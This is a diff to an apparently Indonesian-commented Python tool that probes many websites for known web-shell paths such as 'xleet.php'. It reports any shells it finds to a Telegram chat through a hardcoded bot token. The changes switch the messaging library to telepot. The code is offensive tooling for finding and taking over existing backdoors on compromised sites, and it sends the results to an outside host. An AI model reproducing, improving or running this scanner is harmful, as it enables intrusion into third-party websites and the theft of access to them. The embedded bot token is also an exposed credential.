@@ -1,8 +1,9 @@
 import subprocess
 import sys
+import telepot
 
 # List pustaka yang diperlukan
-required_libraries = ['requests', 'python-telegram-bot']
+required_libraries = ['requests', 'telepot']
 
 # Fungsi untuk memeriksa dan menginstal pustaka yang diperlukan
 def install_missing_libraries():
@@ -19,9 +20,7 @@ install_missing_libraries()
 # Setelah pustaka-pustaka terinstal, Anda dapat melanjutkan dengan import dan menjalankan skrip Anda seperti biasa
 import requests as rq
 from multiprocessing.dummy import Pool as pl
-from telegram import Bot
 import sys
-
 # Token bot Telegram
 TELEGRAM_BOT_TOKEN = '6764902068:AAEntjE5CO8v2iTn220ZdJvG07ERwlNAnRc'
 # ID grup atau pengguna yang akan menerima pesan
@@ -19693,6 +19692,7 @@ files = ['xleet.php',
 'admin.php',
 'about.php',
 'install.php']
+
 def v(url, p='http'):
     for dir in dirs:
         for file in files:
@@ -19719,9 +19719,9 @@ def c(u):
         print('Error occurred while processing {}: {}'.format(u, e))
 
 def send_telegram_message(message):
-    bot = Bot(token=TELEGRAM_BOT_TOKEN)
-    formatted_message = "===========--Result Shell--===========\n{}\n===========--Result Shell--===========".format(message)
-    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=formatted_message)
+    bot = telepot.Bot(TELEGRAM_BOT_TOKEN)
+    formatted_message = "```\n===========--Result Shell--===========\n{}\n===========--Result Shell--===========\n```".format(message)
+    bot.sendMessage(TELEGRAM_CHAT_ID, formatted_message, parse_mode='Markdown')
 
 def bn():
     print("""
@@ -19733,7 +19733,7 @@ def bn():
 
            
  """)
-    
+
 def m():
     try:
         if len(sys.argv) < 2:
